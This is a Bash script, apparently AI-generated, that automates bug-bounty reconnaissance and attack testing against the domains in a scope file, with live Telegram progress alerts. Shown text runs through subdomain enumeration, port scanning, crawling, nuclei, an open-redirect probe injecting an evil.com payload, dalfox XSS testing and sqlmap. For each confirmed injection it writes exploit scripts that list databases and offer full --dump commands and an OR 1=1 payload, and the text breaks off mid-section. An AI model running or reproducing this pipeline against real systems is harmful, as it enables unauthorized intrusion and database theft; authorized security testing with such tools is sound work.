#!/usr/bin/env bash
# bugbounty_scanner_kali_COMPLETO_COM_STATUS.sh
# MVP automated bug-bounty reconnaissance & initial scanning pipeline
# COMPLETO + STATUS EM TEMPO REAL NO TELEGRAM + MULTI-INSTANCE SUPPORT
# Target platform: Kali Linux (uses tools commonly available in Kali repos)
# Usage: sudo ./bugbounty_scanner_kali_COMPLETO_COM_STATUS.sh scope.txt
# Author: generated by ChatGPT (assistant)
# License: Use only on targets you are authorized to test.

set -euo pipefail
IFS=$'\n\t'

### CONFIGURATION (edit if needed) ###
OUTDIR="results_$(date +%Y%m%d_%H%M%S)"
SCOPE_FILE="${1:-}"            # provided as first arg
CONCURRENCY=20                 # REDUZIDO de 50 para 20
NCPU=$(nproc 2>/dev/null || echo 4)
CHAOS_KEY=${CHAOS_KEY:-""}     # export CHAOS_KEY=your_key if you have one
SAVE_JS=true
MAX_CRAWL_DEPTH=2              # REDUZIDO de 3 para 2
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
RATE_LIMIT=50                  # ADICIONADO: Rate limit para nuclei/httpx

# TELEGRAM CONFIG - verificar se existem
TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-}"
TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-}"

# MULTI-INSTANCE TELEGRAM SUPPORT
INSTANCE_ID="$(hostname)_$$_$(date +%s%N | cut -b1-13)"
TELEGRAM_QUEUE_DIR="/tmp/telegram_queue_${USER:-root}"
TELEGRAM_LAST_SEND_FILE="/tmp/telegram_last_send_${USER:-root}"

### Tools used (assumes installed):
# subfinder, amass, findomain, httpx, naabu, nuclei, gau, waybackurls, hakrawler, katana,
# gf, qsreplace, dalfox, sqlmap, jq, sed, awk, grep, curl, wget, unzip

# Quick check for required programs
REQUIRED_TOOLS=(subfinder amass findomain httpx naabu nuclei gau waybackurls hakrawler katana gf qsreplace dalfox sqlmap jq curl wget)
MISSING=()
for t in "${REQUIRED_TOOLS[@]}"; do
  if ! command -v "$t" >/dev/null 2>&1; then
    MISSING+=("$t")
  fi
done
if [ ${#MISSING[@]} -gt 0 ]; then
  echo "[!] Tools missing: ${MISSING[*]}"
  echo "Install missing tools (apt, snap, or from upstream). Continuing may fail."
  # don't exit; user can install and re-run
fi

# Validate scope file
if [ -z "$SCOPE_FILE" ] || [ ! -f "$SCOPE_FILE" ]; then
  echo "Usage: $0 scope.txt"
  echo "scope.txt must contain one domain per line (example.com) or subdomain per line" >&2
  exit 1
fi

mkdir -p "$OUTDIR"
cd "$OUTDIR" || exit 1
# Create all needed directories including new ones
mkdir -p raw subs alive tech ports urls js js/downloads nuclei poc poc/notes reports html logs apis secrets endpoints
cp "$OLDPWD/$SCOPE_FILE" scope.txt

### FUN√á√ÉO PARA CONTADORES SEGUROS ###
safe_count() {
    local file="$1"
    if [ -f "$file" ] && [ -s "$file" ]; then
        wc -l < "$file" | tr -d ' \n'
    else
        echo "0"
    fi
}

### FUN√á√ÉO PARA LOGS COM TIMESTAMP ###
log_info() {
    echo "[$(date '+%H:%M:%S')] $*"
}

log_error() {
    echo "[$(date '+%H:%M:%S')] ERROR: $*" >&2
}

### ENHANCED TELEGRAM FUNCTIONS WITH MULTI-INSTANCE SUPPORT ###

# Initialize Telegram queue system
init_telegram_queue() {
    mkdir -p "$TELEGRAM_QUEUE_DIR" 2>/dev/null || true
    touch "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || true
}

# Rate limiting function - prevents API spam
telegram_rate_limit() {
    local min_interval=2  # Minimum 2 seconds between messages
    local last_send=0
    
    if [ -f "$TELEGRAM_LAST_SEND_FILE" ]; then
        last_send=$(cat "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || echo 0)
    fi
    
    local current_time=$(date +%s)
    local time_diff=$((current_time - last_send))
    
    if [ "$time_diff" -lt "$min_interval" ]; then
        local sleep_time=$((min_interval - time_diff + 1))
        sleep "$sleep_time"
    fi
    
    echo "$current_time" > "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || true
}

# Enhanced Telegram sender with retry logic and instance identification
send_telegram_message_enhanced() {
    local message="$1"
    local urgent="${2:-false}"
    local max_retries=3
    local retry_count=0
    
    if [ -z "$TELEGRAM_BOT_TOKEN" ] || [ -z "$TELEGRAM_CHAT_ID" ]; then
        return 0
    fi
    
    # Add random delay (0-3 seconds) to prevent collision between instances
    local random_delay=$(( RANDOM % 4 ))
    sleep "$random_delay"
    
    # Apply rate limiting
    telegram_rate_limit
    
    # Add instance identifier to message
    local instance_suffix="
üîß Instance: \`${INSTANCE_ID:0:8}...\`"
    
    local formatted_message="$message$instance_suffix"
    
    while [ "$retry_count" -lt "$max_retries" ]; do
        if curl -s -m 15 -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
             -d chat_id="${TELEGRAM_CHAT_ID}" \
             -d parse_mode="Markdown" \
             -d text="$formatted_message" >/dev/null 2>&1; then
            return 0
        fi
        
        retry_count=$((retry_count + 1))
        log_error "Telegram send failed (attempt $retry_count/$max_retries)"
        
        # Exponential backoff: 2^retry_count + random jitter
        local backoff=$(( (2 ** retry_count) + (RANDOM % 3) ))
        sleep "$backoff"
    done
    
    log_error "Failed to send Telegram message after $max_retries attempts"
    return 1
}

### UPDATED TELEGRAM STATUS FUNCTIONS ###
send_telegram_status() {
    local message="$1"
    local urgent="${2:-false}"
    
    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
        local emoji="üìä"
        [ "$urgent" = "true" ] && emoji="üö®"
        
        local formatted_message="${emoji} *Bug Bounty Scanner*
üìÅ \`$(basename "$(pwd)")\`
üïê \`$(date '+%H:%M:%S')\`

$message"
        
        send_telegram_message_enhanced "$formatted_message" "$urgent"
    fi
}

send_telegram_progress() {
    local phase="$1"
    local current="$2"
    local total="$3"
    local details="$4"
    
    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
        local progress_bar=""
        local percentage=0
        
        if [ "$total" -gt 0 ]; then
            percentage=$(( (current * 100) / total ))
            local filled=$(( percentage / 10 ))
            local empty=$(( 10 - filled ))
            
            progress_bar="["
            for ((i=1; i<=filled; i++)); do progress_bar+="‚ñà"; done
            for ((i=1; i<=empty; i++)); do progress_bar+="‚ñë"; done
            progress_bar+="] ${percentage}%"
        fi
        
        local message="‚ö° *${phase}*
${progress_bar}
üìà ${current}/${total} ${details}"
        
        send_telegram_message_enhanced "$message" "false"
    fi
}

send_telegram_alert() {
    local title="$1"
    local finding="$2"
    
    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
        local message="üö® *VULNERABILITY FOUND!*

üéØ *${title}*
üí• \`${finding}\`

üìÅ \`$(basename "$(pwd)")\`
üïê \`$(date '+%H:%M:%S')\`"
        
        send_telegram_message_enhanced "$message" "true"
    fi
}

### FUN√á√ÉO PARA PROCESSAR WILDCARDS NO ESCOPO ###
process_scope() {
    log_info "Processando escopo e tratando wildcards..."
    while read -r line; do
        # Skip comments and empty lines
        [[ "$line" =~ ^[[:space:]]*# ]] && continue
        [[ -z "${line// }" ]] && continue
        
        line=$(echo "$line" | tr '[:upper:]' '[:lower:]' | sed 's/[[:space:]]*$//')
        
        # Handle wildcards
        if [[ "$line" =~ \* ]]; then
            log_info "Wildcard detectado: $line - Convertendo para dom√≠nio base"
            # Extract base domain from wildcard (prod-*.nu.com.co -> nu.com.co)
            base_domain=$(echo "$line" | sed 's/.*\*\.//g')
            if [[ "$base_domain" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                echo "$base_domain"
                log_info "Convertido wildcard $line para: $base_domain"
            else
                log_error "Formato inv√°lido de wildcard: $line - ignorando"
            fi
        else
            # Validate normal domain
            if [[ "$line" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                echo "$line"
            else
                log_error "Formato inv√°lido de dom√≠nio: $line - ignorando"
            fi
        fi
    done < scope.txt
}

# Initialize Telegram queue system
init_telegram_queue

# IN√çCIO DO SCANNER - NOTIFICA√á√ÉO INICIAL
send_telegram_status "üöÄ *INICIANDO SCAN*
üéØ Escopo: \`$(basename "$SCOPE_FILE")\`
üìç Diret√≥rio: \`$OUTDIR\`
‚öôÔ∏è Configura√ß√µes:
- Threads: $CONCURRENCY
- Rate Limit: $RATE_LIMIT/s
- Depth: $MAX_CRAWL_DEPTH"

# CORRE√á√ÉO: Normaliza√ß√£o de escopo melhorada com tratamento de wildcards
process_scope | sort -u > raw/scope.clean.txt

log_info "Output dir: $(pwd)"
log_info "Dom√≠nios v√°lidos processados: $(safe_count raw/scope.clean.txt)"

# Verificar se temos dom√≠nios v√°lidos
if [ ! -s raw/scope.clean.txt ]; then
    log_error "Nenhum dom√≠nio v√°lido encontrado no escopo!"
    send_telegram_status "‚ùå *ERRO CR√çTICO*
Nenhum dom√≠nio v√°lido encontrado no escopo!" true
    exit 1
fi

TOTAL_DOMAINS=$(safe_count raw/scope.clean.txt)
send_telegram_status "‚úÖ *Escopo processado*
üìã $TOTAL_DOMAINS dom√≠nios v√°lidos encontrados"

echo -e "\n========== FASE 1: ENUMERA√á√ÉO DE SUBDOM√çNIOS =========="
send_telegram_status "üîç *FASE 1: SUBDOMAIN ENUMERATION*
Iniciando descoberta com subfinder, amass, findomain..."

mkdir -p raw subs

# rodar em paralelo com timeout MELHORADO
log_info "Rodando subfinder..."
if command -v subfinder >/dev/null 2>&1; then
  timeout 10m subfinder -dL raw/scope.clean.txt -silent -o raw/subfinder.txt 2>/dev/null || true &
fi

log_info "Rodando amass (passive)..."
if command -v amass >/dev/null 2>&1; then
  timeout 15m amass enum -passive -df raw/scope.clean.txt -o raw/amass.txt 2>/dev/null || true &
fi

if command -v findomain >/dev/null 2>&1; then
  log_info "Rodando findomain..."
  timeout 5m findomain -tL raw/scope.clean.txt -u raw/findomain.txt 2>/dev/null || true &
fi

if [ -n "$CHAOS_KEY" ] && command -v chaos >/dev/null 2>&1; then
  log_info "Rodando chaos..."
  timeout 10m chaos -l raw/scope.clean.txt -o raw/chaos.txt 2>/dev/null || true &
fi

wait  # espera todos terminarem

# junta e limpa duplicados
cat raw/*.txt 2>/dev/null \
  | sed 's/^\s*//; s/\s*$//' \
  | grep -Eo "([a-zA-Z0-9][a-zA-Z0-9\.-]+\.[a-zA-Z]{2,})" \
  | sort -u > subs/all_subs.txt

SUBS_FOUND=$(safe_count subs/all_subs.txt)
log_info "Subdom√≠nios encontrados: $SUBS_FOUND"

# Verificar se temos subdom√≠nios
if [ ! -s subs/all_subs.txt ]; then
    log_error "Nenhum subdom√≠nio encontrado!"
    # Usar dom√≠nios do escopo como fallback
    cp raw/scope.clean.txt subs/all_subs.txt
    SUBS_FOUND=$(safe_count subs/all_subs.txt)
fi

send_telegram_status "‚úÖ *FASE 1 COMPLETA*
üåê $SUBS_FOUND subdom√≠nios encontrados
üìä Expans√£o: $(echo "scale=2; $SUBS_FOUND / $TOTAL_DOMAINS" | bc 2>/dev/null || echo "N/A")x"

echo "\n========== PHASE 2: LIVE HOSTS & TECH FINGERPRINT =========="
send_telegram_status "üîç *FASE 2: LIVE HOST DETECTION*
Testando $SUBS_FOUND hosts com httpx..."

# Use httpx to check alive hosts and technologies - COM RATE LIMITING
log_info "Running httpx to detect live hosts and technologies..."
if command -v httpx >/dev/null 2>&1 && [ -s subs/all_subs.txt ]; then
  # CORRIGIDO: Reduzir threads e adicionar rate limiting
  httpx -l subs/all_subs.txt -silent -threads "$CONCURRENCY" -rl "$RATE_LIMIT" -tech-detect -status-code -title -ip -o alive/httpx_results.txt 2>/dev/null || true
  # sa√≠da json tamb√©m (fallback)
  httpx -l subs/all_subs.txt -silent -json -threads "$CONCURRENCY" -rl "$RATE_LIMIT" -tech-detect -o alive/httpx.json 2>/dev/null || true
  
  # Processar resultados apenas se existirem
  if [ -s alive/httpx_results.txt ]; then
    awk '{print $1}' alive/httpx_results.txt | sed 's/,$//' | sort -u > alive/hosts.txt || true
    cat alive/hosts.txt | sed -E 's@https?://@@' | sed 's@/.*@@' | sort -u > alive/hosts_only.txt || true
  fi
fi

# For convenience parse httpx lines into CSV-ish (host,scheme,status,title,ip,tech)
if [ -f alive/httpx.json ] && [ -s alive/httpx.json ]; then
    jq -r '.ip as $ip | .url as $url | .status as $status | .title as $title | (.tech[]? // []) | "\($url) \t\($status) \t\($ip) \t\($title) \t\(.)"' alive/httpx.json > alive/httpx_parsed.txt 2>/dev/null || true
fi

LIVE_HOSTS=$(safe_count alive/hosts_only.txt)
log_info "Live hosts: $LIVE_HOSTS"

# Verificar se temos hosts vivos
if [ ! -s alive/hosts_only.txt ]; then
    log_error "Nenhum host vivo encontrado! Continuando com escopo original..."
    # Usar dom√≠nios do escopo como fallback
    cp raw/scope.clean.txt alive/hosts_only.txt
    # Criar vers√µes com protocolo
    sed 's/^/https:\/\//' raw/scope.clean.txt > alive/hosts.txt
    LIVE_HOSTS=$(safe_count alive/hosts_only.txt)
fi

send_telegram_status "‚úÖ *FASE 2 COMPLETA*
‚úÖ $LIVE_HOSTS hosts ativos
üìä Taxa de sucesso: $(echo "scale=1; $LIVE_HOSTS * 100 / $SUBS_FOUND" | bc 2>/dev/null || echo "N/A")%"

echo "\n========== PHASE 3: PORT SCAN =========="
send_telegram_status "üîç *FASE 3: PORT SCANNING*
Escaneando portas em $LIVE_HOSTS hosts..."

# Use naabu against live hosts - COM RATE LIMITING
if command -v naabu >/dev/null 2>&1 && [ -s alive/hosts_only.txt ]; then
  log_info "Running naabu (top ports) - using hosts file"
  # CORRIGIDO: Adicionar rate limiting e timeout
  timeout 30m naabu -list alive/hosts_only.txt -top-ports 1000 -rate "$RATE_LIMIT" -o ports/naabu_raw.txt || true
  
  if [ -s ports/naabu_raw.txt ]; then
    sort -u ports/naabu_raw.txt > ports/naabu.txt || true
    awk -F":" '{print $1}' ports/naabu.txt | sort -u > ports/hosts_with_ports.txt || true
  fi
fi

PORTS_FOUND=$(safe_count ports/naabu.txt)
HOSTS_WITH_PORTS=$(safe_count ports/hosts_with_ports.txt)

send_telegram_status "‚úÖ *FASE 3 COMPLETA*
üö™ $PORTS_FOUND portas abertas
üè† $HOSTS_WITH_PORTS hosts com portas"

echo "\n========== PHASE 4: CRAWLING & URL COLLECTION =========="
send_telegram_status "üï∑Ô∏è *FASE 4: URL CRAWLING*
Coletando URLs com gau, wayback, hakrawler, katana..."

# VERIFICAR se temos hosts vivos antes de continuar
if [ ! -s alive/hosts_only.txt ]; then
    log_error "Nenhum host vivo para fazer crawling!"
    touch urls/all_urls_raw.txt urls/with_params.txt js/js_urls_raw.txt
else
    # gau - COM CONTROLE DE PROCESSOS
    if command -v gau >/dev/null 2>&1; then
      log_info "Running gau with corrected domain format..."
      send_telegram_progress "GAU Collection" 1 4 "hist√≥rico de URLs"
      mkdir -p urls/gau
      # CORRIGIDO: Limitar a 5 processos paralelos em vez de 10
      cat alive/hosts_only.txt | head -20 | xargs -P 5 -I{} bash -c 'set -e; domain="{}"; echo "[gau] $domain"; timeout 60s gau "$domain" 2>/dev/null || true' > urls/gau.txt || true
    fi

    # waybackurls - COM TIMEOUT
    if command -v waybackurls >/dev/null 2>&1; then
      log_info "Running waybackurls..."
      send_telegram_progress "Wayback Collection" 2 4 "arquivo hist√≥rico"
      # CORRIGIDO: Timeout individual por host
      timeout 10m cat alive/hosts_only.txt | head -10 | while read host; do
        echo "$host" | timeout 30s waybackurls 2>/dev/null || true
      done > urls/wayback.txt || true
    fi

    # hakrawler - CORRIGIDO com controle de processos
    if command -v hakrawler >/dev/null 2>&1 && [ -s alive/hosts.txt ]; then
      log_info "Running hakrawler (correct flags)"
      send_telegram_progress "Hakrawler" 3 4 "crawling ativo"
      rm -f urls/hakrawler.txt
      # CORRIGIDO: Limitar a 3 processos paralelos e timeout individual
      cat alive/hosts.txt | head -10 | xargs -P 3 -I{} bash -c 'echo "[hakrawler] {}"; timeout 45s echo {} | hakrawler -d '"$MAX_CRAWL_DEPTH"' -subs -t 10 2>/dev/null || true' >> urls/hakrawler.txt || true
    fi

    # katana - CORRIGIDO com timeout
    if command -v katana >/dev/null 2>&1 && [ -s alive/hosts.txt ]; then
      log_info "Running katana (corrected usage)"
      send_telegram_progress "Katana" 4 4 "crawling avan√ßado"
      mkdir -p urls/katana
      cat alive/hosts.txt | head -5 | while read -r host; do
        safe=$(echo "$host" | sed 's/[^a-zA-Z0-9]/_/g')
        log_info "[katana] $host"
        # CORRIGIDO: Adicionar timeout individual
        timeout 60s katana -u "$host" -o "urls/katana/katana_${safe}.txt" -silent 2>/dev/null || true
      done
      # Merge all katana results
      cat urls/katana/*.txt 2>/dev/null >> urls/katana.txt || true
    fi
fi

# Merge and clean collected urls
cat urls/*.txt 2>/dev/null | grep -E "https?://" | sort -u > urls/all_urls_raw.txt || true

# Extract parameterized URLs
grep -E "\?" urls/all_urls_raw.txt | sort -u > urls/with_params.txt || true

# Extract JS files
grep -E "\.js(\?|$)" urls/all_urls_raw.txt | sed -E 's#\?.*##' | sort -u > js/js_urls_raw.txt || true

TOTAL_URLS=$(safe_count urls/all_urls_raw.txt)
PARAM_URLS=$(safe_count urls/with_params.txt)
JS_FILES=$(safe_count js/js_urls_raw.txt)

send_telegram_status "‚úÖ *FASE 4 COMPLETA*
üîó $TOTAL_URLS URLs coletadas
üéØ $PARAM_URLS com par√¢metros
üìú $JS_FILES arquivos JavaScript"

# optionally download JS files - COM CONTROLE MELHORADO
if [ "$SAVE_JS" = true ] && [ -s js/js_urls_raw.txt ]; then
  log_info "Downloading JS files with per-call timeout..."
  send_telegram_status "üì• *DOWNLOAD JS FILES*
Baixando $JS_FILES arquivos JavaScript..."
  
  mkdir -p js/downloads
  export USER_AGENT
  
  # Contador para progresso
  current_js=0
  total_js=$(cat js/js_urls_raw.txt | head -50 | wc -l)
  
  cat js/js_urls_raw.txt | head -50 | while read -r url; do
    current_js=$((current_js + 1))
    
    # Atualizar progresso a cada 10 arquivos
    if [ $((current_js % 10)) -eq 0 ]; then
      send_telegram_progress "JS Download" "$current_js" "$total_js" "arquivos"
    fi
    
    fname="js/downloads/$(echo "$url" | sed "s#https\?://##; s/[^a-zA-Z0-9]/_/g")"
    timeout 30s curl -L --max-time 25 --connect-timeout 5 --retry 1 -sS -A "$USER_AGENT" "$url" -o "$fname" 2>/dev/null || {
      echo "[js-download] failed or timed out: $url" >> logs/js_download_errors.log
      rm -f "$fname"
    }
  done
fi

JS_DOWNLOADED=$(find js/downloads -name "*.js" -o -name "*" | wc -l 2>/dev/null || echo 0)
log_info "Collected $TOTAL_URLS URLs, $PARAM_URLS with params, $JS_FILES JS files listed, $JS_DOWNLOADED downloaded."

# ============= NUCLEI SCANNING COM RATE LIMITING =============
echo "\n========== NUCLEI SCANNING - FAST & EXTENDED MODES =========="
send_telegram_status "üéØ *NUCLEI VULNERABILITY SCAN*
Iniciando varredura de vulnerabilidades..."

if command -v nuclei >/dev/null 2>&1; then
  log_info "Running nuclei FAST mode (critical vulnerabilities)..."
  send_telegram_progress "Nuclei FAST" 1 4 "vulnerabilidades cr√≠ticas"
  
  # VERIFICAR se temos dados para scan
  if [ -s alive/hosts.txt ]; then
    # FAST MODE - Critical only - COM RATE LIMITING MELHORADO
    timeout 1h cat alive/hosts.txt | head -50 | nuclei -silent \
      -tags cves,exposures,tokens,takeovers,default-logins \
      -severity critical,high \
      -concurrency 15 -rl "$RATE_LIMIT" \
      -o nuclei/nuclei_hosts_fast.txt 2>/dev/null || true
  fi

  if [ -s urls/all_urls_raw.txt ]; then
    timeout 1h cat urls/all_urls_raw.txt | head -100 | nuclei -silent \
      -tags cves,exposures,tokens,takeovers,default-logins \
      -severity critical,high \
      -concurrency 15 -rl "$RATE_LIMIT" \
      -o nuclei/nuclei_urls_fast.txt 2>/dev/null || true
  fi

  NUCLEI_FAST_COUNT=$(safe_count nuclei/nuclei_hosts_fast.txt)
  NUCLEI_FAST_URLS=$(safe_count nuclei/nuclei_urls_fast.txt)
  
  # Alertar se vulnerabilidades cr√≠ticas encontradas
  if [ "$NUCLEI_FAST_COUNT" -gt 0 ] || [ "$NUCLEI_FAST_URLS" -gt 0 ]; then
    send_telegram_alert "CRITICAL VULNERABILITIES" "$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS)) vulnerabilities found by Nuclei"
  fi

  log_info "Running nuclei EXTENDED mode (medium-risk)..."
  send_telegram_progress "Nuclei EXTENDED" 2 4 "riscos m√©dios"
  
  # EXTENDED MODE - Medium risk misconfigurations - COM RATE LIMITING
  if [ -s alive/hosts.txt ]; then
    timeout 2h cat alive/hosts.txt | head -30 | nuclei -silent \
      -tags misconfig,panels,default-logins,exposures \
      -severity high,critical,medium \
      -concurrency 10 -rl 50 \
      -o nuclei/nuclei_hosts_ext.txt 2>/dev/null || true
  fi

  if [ -s urls/all_urls_raw.txt ]; then
    timeout 2h cat urls/all_urls_raw.txt | head -50 | nuclei -silent \
      -tags misconfig,panels,default-logins,exposures \
      -severity high,critical,medium \
      -concurrency 10 -rl 50 \
      -o nuclei/nuclei_urls_ext.txt 2>/dev/null || true
  fi
fi

NUCLEI_EXT_COUNT=$(safe_count nuclei/nuclei_hosts_ext.txt)
NUCLEI_EXT_URLS=$(safe_count nuclei/nuclei_urls_ext.txt)

send_telegram_status "‚úÖ *NUCLEI SCAN COMPLETO*
üî• Cr√≠ticas: $((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
‚ö†Ô∏è M√©dias: $((NUCLEI_EXT_COUNT + NUCLEI_EXT_URLS))"

# quick open-redirect check using qsreplace and httpx - COM VERIFICA√á√ÉO
if command -v qsreplace >/dev/null 2>&1 && command -v httpx >/dev/null 2>&1 && [ -s urls/with_params.txt ]; then
  log_info "Testing potential open redirects (simple payload)..."
  send_telegram_progress "Open Redirect Test" 3 4 "redirecionamentos"

  cat urls/with_params.txt \
    | head -20 \
    | gf redirect 2>/dev/null \
    | qsreplace 'https://evil.com' \
    | httpx -silent -follow-redirects \
        -mc 301,302,303,307,308 \
        -c 25 -rate-limit 50 \
    | tee -a logs/open_redirects.log \
    > nuclei/open_redirects.txt 2>/dev/null || true

  OPEN_REDIRECTS=$(safe_count nuclei/open_redirects.txt)
  log_info "Open redirect check finished. Results saved in nuclei/open_redirects.txt"
  
  if [ "$OPEN_REDIRECTS" -gt 0 ]; then
    send_telegram_alert "OPEN REDIRECTS" "$OPEN_REDIRECTS potential open redirects found"
  fi
fi

# ============= DALFOX XSS TESTING COM CONTROLE =============
echo "\n========== DALFOX XSS TESTING =========="
send_telegram_status "‚ùå *XSS VULNERABILITY SCAN*
Testando $PARAM_URLS URLs para XSS..."

if command -v dalfox >/dev/null 2>&1 && [ -s urls/with_params.txt ]; then
  log_info "Running dalfox XSS testing..."
  send_telegram_progress "Dalfox XSS" 4 4 "Cross-Site Scripting"
  
  # CORRIGIDO: Reduzir workers e adicionar timeout
  WORKERS=25  # Reduzido de 50
  TIMEOUT=10  # Aumentado de 6
  
  log_info "Running dalfox with workers=$WORKERS timeout=${TIMEOUT}s"
  
  # Execute dalfox - COM LIMITE DE URLs
  timeout 30m cat urls/with_params.txt | head -50 | dalfox pipe \
    -w "$WORKERS" \
    --timeout "$TIMEOUT" \
    --skip-bav \
    --silence \
    -o nuclei/dalfox_results.txt 2>/dev/null || true
  
  DALFOX_RESULTS=$(safe_count nuclei/dalfox_results.txt)
  log_info "Dalfox completed. Output: nuclei/dalfox_results.txt"
  
  if [ "$DALFOX_RESULTS" -gt 0 ]; then
    send_telegram_alert "XSS VULNERABILITIES" "$DALFOX_RESULTS XSS vulnerabilities found by Dalfox"
  fi
else
  log_error "dalfox n√£o dispon√≠vel ou sem URLs com par√¢metros"
fi

# ============= SQLMAP COM VERIFICA√á√ïES MELHORADAS E STATUS =============
echo "\n========== VALIDA√á√ÉO SQLI AVAN√áADA =========="
send_telegram_status "üíâ *SQL INJECTION TESTING*
Iniciando an√°lise SQLi em $PARAM_URLS URLs..."

if command -v sqlmap >/dev/null 2>&1 && command -v gf >/dev/null 2>&1; then
  log_info "Iniciando detec√ß√£o e valida√ß√£o SQLi..."
  
  # Preparar diret√≥rios
  mkdir -p poc/sqli logs/sqlmap urls
  
  # FASE 1: Coleta de candidatos SQLi (melhorada) - COM VERIFICA√á√ÉO
  log_info "Coletando candidatos SQLi com m√∫ltiplas t√©cnicas..."
  send_telegram_progress "SQLi Detection" 1 3 "identificando candidatos"
  
  # Limpar arquivo de candidatos
  > urls/sqli_candidates_raw.txt
  
  # VERIFICAR se temos URLs com par√¢metros
  if [ -s urls/with_params.txt ]; then
    # gf sqli (se dispon√≠vel)
    cat urls/with_params.txt | gf sqli 2>/dev/null >> urls/sqli_candidates_raw.txt || true
    
    # Regex patterns para par√¢metros suspeitos
    grep -Ei "(\?|&)(id|user|search|category|page|item|product|article|post|news)=" urls/with_params.txt >> urls/sqli_candidates_raw.txt 2>/dev/null || true
    grep -Ei "(\?|&)(select|union|order|where|from)=" urls/with_params.txt >> urls/sqli_candidates_raw.txt 2>/dev/null || true
    grep -Ei "\.php\?.*=" urls/with_params.txt >> urls/sqli_candidates_raw.txt 2>/dev/null || true
    grep -Ei "\.asp\?.*=" urls/with_params.txt >> urls/sqli_candidates_raw.txt 2>/dev/null || true
  fi
  
  # Filtrar e limpar duplicatas
  if [ -s urls/sqli_candidates_raw.txt ]; then
    cat urls/sqli_candidates_raw.txt | sort -u | grep -E "^https?://" > urls/sqli_candidates.txt || true
    rm -f urls/sqli_candidates_raw.txt
    
    TOTAL_CANDIDATES=$(safe_count urls/sqli_candidates.txt)
    log_info "Encontrados $TOTAL_CANDIDATES candidatos SQLi"
    
    send_telegram_status "üéØ *SQLi CANDIDATES FOUND*
üìä $TOTAL_CANDIDATES candidatos identificados
üß™ Iniciando valida√ß√£o com sqlmap..."
    
    # FASE 2: Amostragem estrat√©gica e valida√ß√£o com sqlmap - LIMITADA COM STATUS
    if [ "$TOTAL_CANDIDATES" -gt 0 ]; then
      # Pegar amostra variada: primeiros 20, √∫ltimos 20, alguns do meio
      head -n 20 urls/sqli_candidates.txt > urls/sqli_sample.txt
      if [ "$TOTAL_CANDIDATES" -gt 40 ]; then
        tail -n 20 urls/sqli_candidates.txt >> urls/sqli_sample.txt
      fi
      if [ "$TOTAL_CANDIDATES" -gt 50 ]; then
        # Pegar alguns do meio tamb√©m
        middle_start=$((TOTAL_CANDIDATES / 3))
        sed -n "${middle_start},$((middle_start + 10))p" urls/sqli_candidates.txt >> urls/sqli_sample.txt 2>/dev/null || true
      fi
      
      # Remover duplicatas da amostra
      sort -u urls/sqli_sample.txt > urls/sqli_sample_clean.txt
      mv urls/sqli_sample_clean.txt urls/sqli_sample.txt
      
      SAMPLE_SIZE=$(safe_count urls/sqli_sample.txt)
      log_info "Testando amostra de $SAMPLE_SIZE URLs com sqlmap..."
      
      send_telegram_progress "SQLi Validation" 2 3 "testando com sqlmap"
      
      # Preparar arquivo de resultados
      > urls/sqli_validated.txt
      > nuclei/sqlmap_checked.txt
      > poc/sqli/sqlmap_results.txt
      
      # Contador para progresso
      current=0
      
      # Testar cada URL individualmente com timeout E STATUS
      while read -r url; do
        current=$((current + 1))
        log_info "[sqlmap $current/$SAMPLE_SIZE] $url"
        
        # Atualizar progresso no Telegram a cada 5 URLs
        if [ $((current % 5)) -eq 0 ]; then
          send_telegram_progress "SQLmap Testing" "$current" "$SAMPLE_SIZE" "URLs testadas"
        fi
        
        # Hash √∫nico para este URL
        url_hash=$(echo "$url" | md5sum | cut -c1-8)
        log_file="logs/sqlmap/sqlmap_${url_hash}.txt"
        mkdir -p logs/sqlmap
        
        # Executar sqlmap com timeout individual
        timeout 120s sqlmap \
          -u "$url" \
          --batch --level=1 --risk=1 \
          --random-agent --threads=2 \
          --technique=BEUST \
          --no-cast --disable-coloring \
          --answers="follow=N,other=N,crack=N,dict=N,keep=Y" \
          --output-dir="poc/sqli" \
          --timeout=30 --retries=1 \
          > "$log_file" 2>&1 || {
            echo "[TIMEOUT/ERROR] $url" >> logs/sqlmap/errors.log
            continue
          }
        
        # Verificar se encontrou vulnerabilidade NESTE URL espec√≠fico
        if grep -qi "parameter.*is vulnerable\|sqlmap identified the following injection point\|payload.*worked" "$log_file"; then
          echo "[VULNERABLE] $url" >> urls/sqli_validated.txt
          echo "[$(date)] VULNERABLE: $url" >> nuclei/sqlmap_checked.txt
          
          # ALERTA IMEDIATO NO TELEGRAM
          send_telegram_alert "SQL INJECTION CONFIRMED" "$url"
          
          # Gerar comando de exploit para PoC
          echo "# SQLi encontrada em: $url" >> poc/sqli/sqlmap_results.txt
          echo "sqlmap -u '$url' --batch --dump --threads=4" >> poc/sqli/sqlmap_results.txt
          echo "sqlmap -u '$url' --batch --dbs --threads=4" >> poc/sqli/sqlmap_results.txt
          echo "# Log detalhado: $log_file" >> poc/sqli/sqlmap_results.txt
          echo "" >> poc/sqli/sqlmap_results.txt
          
          # Criar PoC individual
          cat > "poc/sqli/exploit_${url_hash}.sh" <<-SQLPOC
#!/bin/bash
# SQLi exploit para: $url
# Encontrada em: $(date)

echo "=== SQLi Exploitation PoC ==="
echo "Target: $url"
echo ""

echo "1. Listando databases:"
sqlmap -u "$url" --batch --dbs --threads=4

echo ""
echo "2. Para dump completo (cuidado!):"  
echo "sqlmap -u '$url' --batch --dump --threads=4"

echo ""
echo "3. Para teste manual:"
echo "curl '$url' --data-urlencode \"param=1' OR 1=1--\""
SQLPOC
          chmod +x "poc/sqli/exploit_${url_hash}.sh"
          
